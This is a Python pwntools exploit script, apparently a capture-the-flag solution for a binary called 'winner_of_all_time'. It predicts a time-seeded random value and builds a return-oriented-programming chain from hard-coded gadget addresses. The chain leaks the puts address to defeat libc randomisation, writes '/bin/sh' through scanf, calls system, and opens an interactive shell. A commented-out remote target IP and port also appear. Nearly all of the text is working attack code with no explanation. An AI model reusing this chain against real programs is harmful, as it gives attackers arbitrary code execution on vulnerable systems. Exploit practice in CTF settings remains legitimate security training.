from pwn import *
from ctypes import CDLL
from bitstring import Bits
libc = CDLL('libc.so.6')
script = """
b*0x4016DE
b*0x40152A
"""
context.binary='./winner_of_all_time'
elf = ELF('./winner_of_all_time')
#p = remote("157.245.147.89",28333)
seed = libc.time(0)
libc.srand(seed)
requirement = libc.rand() % 123456789
def sendchunk(a: bytes):
    for i in range(0,23):
        p.sendline(a)
        time.sleep(0.1)
        print(p.recv().decode())

def breakcode(b: bytes):
    p.sendline(b)
    time.sleep(0.1)
    try:
        print(p.recv())
    except Exception:
        pass

def converter(c: int):
    return str(c).encode()

def two_complement(d: int):
    ToBin = bin(d)
    ToBin2 = Bits(bin=ToBin)
    return ToBin2.int

def send_null(e: bytes):
    p.send(e)
    time.sleep(0.1)
    print(p.recv())

add_rsp = 0x0000000000401016
pop_rdi = 0x0000000000401589
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln_func = 0x4015a1

read_input = 0x40152A

scanf_plt = elf.plt['__isoc99_scanf']
call_scanf = 0x000000000401548

pop_rsi_r15 = 0x0000000000401596

ret = 0x000000000040101a




#p = remote("localhost",1337)
p = process()
#g = process('./a.out')
#requirement = int(g.recv().strip(b'\n').decode())
#gdb.attach(p,script)

#requirement += 1

p.recv()

#time.sleep(1)

log.info("Requirement: %s", hex(requirement))
sendchunk(b'1')
#p.recv()




breakcode(str(pop_rdi).encode())
breakcode(str(puts_got).encode())
breakcode(str(puts_plt).encode())

# breakcode(converter(ret))
# breakcode(converter(pop_rdi))
# breakcode(converter(0x40270f))
# breakcode(converter(pop_rsi_r15))
# breakcode(converter(0x404060))
# breakcode(converter(0x0))
# breakcode(converter(scanf_plt))

breakcode(converter(ret))
breakcode(converter(pop_rdi))
breakcode(converter(0x40270f))
breakcode(converter(pop_rsi_r15))
breakcode(converter(0x404f00))
breakcode(converter(0x0))
breakcode(converter(scanf_plt))

breakcode(str(pop_rdi).encode())
breakcode(str(puts_got).encode())
breakcode(str(puts_plt).encode())

breakcode(converter(ret))
breakcode(converter(pop_rdi))
breakcode(converter(0x40270f))
breakcode(converter(pop_rsi_r15))
breakcode(converter(0x404060))
breakcode(converter(0x0))
breakcode(converter(scanf_plt))

# breakcode(str(pop_rdi).encode())
# breakcode(str(puts_got).encode())
# breakcode(str(puts_plt).encode())

# breakcode(converter(ret))
# breakcode(converter(pop_rdi))
# breakcode(converter(0x40270f))
# breakcode(converter(pop_rsi_r15))
# breakcode(converter(0x404f00+16))
# breakcode(converter(0x0))
# breakcode(converter(scanf_plt))


# breakcode(str(pop_rdi).encode())
# breakcode(str(puts_got).encode())
# breakcode(str(puts_plt).encode())


# breakcode(converter(ret))
# breakcode(converter(pop_rdi))
# breakcode(converter(0x40270f))
# breakcode(converter(pop_rsi_r15))
# breakcode(converter(0x404f00+24))
# breakcode(converter(0x0))
# breakcode(converter(scanf_plt))



# breakcode(converter(0x000000000040127d))
# breakcode(converter(0x404f00-8))
# breakcode(converter(0x00000000004013ac))

breakcode(converter(pop_rdi))
breakcode(converter(0x404f00))
breakcode(converter(call_scanf))
#breakcode(converter(ret))
#breakcode(converter(0x0000000000401593))

#gdb.attach(p,script)

#breakcode(converter(vuln_func))




p.sendline(str(requirement).encode())



#print(p.recv().decode())

p.recvuntil(b'Welcome to sanctuary of time\n')

leak_libc = u64(p.recvline().strip(b'\n').ljust(8,b'\x00'))

log.info("Leak_libc: %s", hex(leak_libc))

system_func = leak_libc - 0x300e0

bin_sh = leak_libc + 0x157848

log.info("System func: %s", hex(system_func))

log.info("/bin/sh: %s", hex(bin_sh))

seed2 = libc.srand(libc.time(0))
requirement2 = libc.rand() % 123456789
log.info("Requirement2: %s", hex(requirement2))

breakcode(converter(0x68732f6e69622f))
time.sleep(0.2)
#breakcode(converter(pop_rdi))
# breakcode(converter(bin_sh))
# breakcode(converter(ret))
p.sendline(converter(system_func))
#breakcode(send_null(converter(system_func)))

#breakcode(converter((system_func)))

#p.recv() b*0x401630 breakcode(str(vuln_func).encode())



#breakcode(converter(requirement2))

#sendchunk(b'2')

# breakcode(converter(ret))
# breakcode(converter(pop_rdi))
# breakcode(converter(0x40270f))
# breakcode(converter(pop_rsi_r15))
# breakcode(converter(0x404f00+8))
# breakcode(converter(0x0))
# breakcode(converter(scanf_plt))


# breakcode(converter(ret))
# breakcode(converter(pop_rdi))
# breakcode(converter(0x40270f))
# breakcode(converter(pop_rsi_r15))
# breakcode(converter(0x404f00+16))
# breakcode(converter(0x0))
# breakcode(converter(scanf_plt))
# gdb.attach(p,script)
# breakcode(converter(requirement2))

# breakcode(converter(pop_rdi))

# breakcode(converter(bin_sh))








#p.sendline(str(requirement).encode())
p.interactive()

